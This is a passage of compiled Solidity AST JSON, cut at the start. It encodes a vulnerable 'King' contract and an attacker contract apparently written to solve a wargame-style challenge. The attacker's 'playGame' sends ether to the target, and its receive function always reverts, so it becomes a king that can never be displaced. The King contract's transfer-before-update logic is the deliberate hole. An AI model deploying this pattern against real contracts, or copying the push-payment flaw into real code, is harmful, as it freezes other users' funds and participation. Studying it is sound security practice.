																"typeIdentifier": "t_type$_t_contract$_King_$115_$",
																"typeString": "type(contract King)"
															}
														},
														"id": 12,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "169:13:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_King_$115",
															"typeString": "contract King"
														}
													},
													"src": "160:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_King_$115",
														"typeString": "contract King"
													}
												},
												"id": 14,
												"nodeType": "ExpressionStatement",
												"src": "160:22:0"
											}
										]
									},
									"id": 16,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 7,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 6,
												"mutability": "mutable",
												"name": "_target",
												"nodeType": "VariableDeclaration",
												"scope": 16,
												"src": "116:23:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address_payable",
													"typeString": "address payable"
												},
												"typeName": {
													"id": 5,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "116:15:0",
													"stateMutability": "payable",
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "115:25:0"
									},
									"returnParameters": {
										"id": 8,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "149:0:0"
									},
									"scope": 46,
									"src": "104:86:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 37,
										"nodeType": "Block",
										"src": "235:105:0",
										"statements": [
											{
												"assignments": [
													20,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 20,
														"mutability": "mutable",
														"name": "ok",
														"nodeType": "VariableDeclaration",
														"scope": 37,
														"src": "247:7:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 19,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "247:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													},
													null
												],
												"id": 31,
												"initialValue": {
													"arguments": [
														{
															"hexValue": "",
															"id": 29,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "297:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															},
															"value": ""
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																	"typeString": "literal_string \"\""
																}
															],
															"expression": {
																"arguments": [
																	{
																		"id": 23,
																		"name": "target",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 4,
																		"src": "266:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_King_$115",
																			"typeString": "contract King"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_King_$115",
																			"typeString": "contract King"
																		}
																	],
																	"id": 22,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "258:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 21,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "258:7:0",
																		"typeDescriptions": {}
																	}
																},
																"id": 24,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "258:15:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"id": 25,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "call",
															"nodeType": "MemberAccess",
															"src": "258:20:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
															}
														},
														"id": 28,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"names": [
															"value"
														],
														"nodeType": "FunctionCallOptions",
														"options": [
															{
																"expression": {
																	"id": 26,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967281,
																	"src": "286:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 27,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "value",
																"nodeType": "MemberAccess",
																"src": "286:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"src": "258:38:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 30,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "258:42:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "246:54:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 33,
															"name": "ok",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 20,
															"src": "319:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"hexValue": "6e6f74206f6b",
															"id": 34,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "323:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_95287e1b0b3878226ee3a7a634a45317c61b39ae8b901ed8e53fbb8f5afbb613",
																"typeString": "literal_string \"not ok\""
															},
															"value": "not ok"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_95287e1b0b3878226ee3a7a634a45317c61b39ae8b901ed8e53fbb8f5afbb613",
																"typeString": "literal_string \"not ok\""
															}
														],
														"id": 32,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "311:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 35,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "311:21:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 36,
												"nodeType": "ExpressionStatement",
												"src": "311:21:0"
											}
										]
									},
									"functionSelector": "af899735",
									"id": 38,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "playGame",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 17,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "215:2:0"
									},
									"returnParameters": {
										"id": 18,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "235:0:0"
									},
									"scope": 46,
									"src": "198:142:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 44,
										"nodeType": "Block",
										"src": "379:28:0",
										"statements": [
											{
												"expression": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 41,
														"name": "revert",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967277,
															4294967277
														],
														"referencedDeclaration": 4294967277,
														"src": "391:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_revert_pure$__$returns$__$",
															"typeString": "function () pure"
														}
													},
													"id": 42,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "391:8:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 43,
												"nodeType": "ExpressionStatement",
												"src": "391:8:0"
											}
										]
									},
									"id": 45,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 39,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "359:2:0"
									},
									"returnParameters": {
										"id": 40,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "379:0:0"
									},
									"scope": 46,
									"src": "352:55:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 116,
							"src": "60:350:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 115,
							"linearizedBaseContracts": [
								115
							],
							"name": "King",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 48,
									"mutability": "mutable",
									"name": "king",
									"nodeType": "VariableDeclaration",
									"scope": 115,
									"src": "435:12:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 47,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "435:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"functionSelector": "e3ac5d26",
									"id": 50,
									"mutability": "mutable",
									"name": "prize",
									"nodeType": "VariableDeclaration",
									"scope": 115,
									"src": "452:17:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 49,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "452:4:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"functionSelector": "8da5cb5b",
									"id": 52,
									"mutability": "mutable",
									"name": "owner",
									"nodeType": "VariableDeclaration",
									"scope": 115,
									"src": "474:20:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 51,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "474:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "public"
								},
								{
									"body": {
										"id": 70,
										"nodeType": "Block",
										"src": "523:81:0",
										"statements": [
											{
												"expression": {
													"id": 58,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 55,
														"name": "owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 52,
														"src": "530:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"expression": {
															"id": 56,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 4294967281,
															"src": "538:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 57,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"src": "538:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "530:18:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 59,
												"nodeType": "ExpressionStatement",
												"src": "530:18:0"
											},
											{
												"expression": {
													"id": 63,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 60,
														"name": "king",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 48,
														"src": "557:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"expression": {
															"id": 61,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 4294967281,
															"src": "564:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 62,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"src": "564:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "557:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 64,
												"nodeType": "ExpressionStatement",
												"src": "557:17:0"
											},
											{
												"expression": {
													"id": 68,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 65,
														"name": "prize",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 50,
														"src": "581:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"expression": {
															"id": 66,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 4294967281,
															"src": "589:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 67,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "value",
														"nodeType": "MemberAccess",
														"src": "589:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "581:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 69,
												"nodeType": "ExpressionStatement",
												"src": "581:17:0"
											}
										]
									},
									"id": 71,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 53,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "512:2:0"
									},
									"returnParameters": {
										"id": 54,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "523:0:0"
									},
									"scope": 115,
									"src": "501:103:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 105,
										"nodeType": "Block",
										"src": "637:151:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 83,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 78,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"expression": {
																		"id": 75,
																		"name": "msg",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 4294967281,
																		"src": "652:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_message",
																			"typeString": "msg"
																		}
																	},
																	"id": 76,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "value",
																	"nodeType": "MemberAccess",
																	"src": "652:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">=",
																"rightExpression": {
																	"id": 77,
																	"name": "prize",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 50,
																	"src": "665:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "652:18:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "||",
															"rightExpression": {
																"commonType": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																},
																"id": 82,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"expression": {
																		"id": 79,
																		"name": "msg",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 4294967281,
																		"src": "674:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_message",
																			"typeString": "msg"
																		}
																	},
																	"id": 80,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "sender",
																	"nodeType": "MemberAccess",
																	"src": "674:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "==",
																"rightExpression": {
																	"id": 81,
																	"name": "owner",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 52,
																	"src": "688:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"src": "674:19:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "652:41:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 74,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "644:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 84,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "644:50:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 85,
												"nodeType": "ExpressionStatement",
												"src": "644:50:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"expression": {
																"id": 91,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967281,
																"src": "724:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 92,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "value",
															"nodeType": "MemberAccess",
															"src": "724:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 88,
																	"name": "king",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 48,
																	"src": "709:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 87,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "701:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_payable_$",
																	"typeString": "type(address payable)"
																},
																"typeName": {
																	"id": 86,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "701:8:0",
																	"stateMutability": "payable",
																	"typeDescriptions": {}
																}
															},
															"id": 89,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "701:13:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 90,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"src": "701:22:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 93,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "701:33:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 94,
												"nodeType": "ExpressionStatement",
												"src": "701:33:0"
											},
											{
												"expression": {
													"id": 98,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 95,
														"name": "king",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 48,
														"src": "741:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"expression": {
															"id": 96,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 4294967281,
															"src": "748:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 97,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"src": "748:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "741:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 99,
												"nodeType": "ExpressionStatement",
												"src": "741:17:0"
											},
											{
												"expression": {
													"id": 103,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 100,
														"name": "prize",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 50,
														"src": "765:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"expression": {
															"id": 101,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 4294967281,
															"src": "773:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 102,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "value",
														"nodeType": "MemberAccess",
														"src": "773:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "765:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 104,
												"nodeType": "ExpressionStatement",
												"src": "765:17:0"
											}
										]
									},
									"id": 106,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 72,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "617:2:0"
									},
									"returnParameters": {
										"id": 73,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "637:0:0"
									},
									"scope": 115,
									"src": "610:178:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 113,
										"nodeType": "Block",
										"src": "841:24:0",
										"statements": [
											{
												"expression": {
													"id": 111,
													"name": "king",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 48,
													"src": "855:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"functionReturnParameters": 110,
												"id": 112,
												"nodeType": "Return",
												"src": "848:11:0"
											}
										]
									},
									"functionSelector": "29cc6d6f",
									"id": 114,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_king",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 107,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "808:2:0"
									},
									"returnParameters": {
										"id": 110,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 109,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 114,
												"src": "832:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 108,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "832:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "831:9:0"
									},
									"scope": 115,
									"src": "794:71:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 116,
							"src": "414:454:0"
						}
					],
					"src": "33:835:0"
				},
				"id": 0
			}
		}
	}
}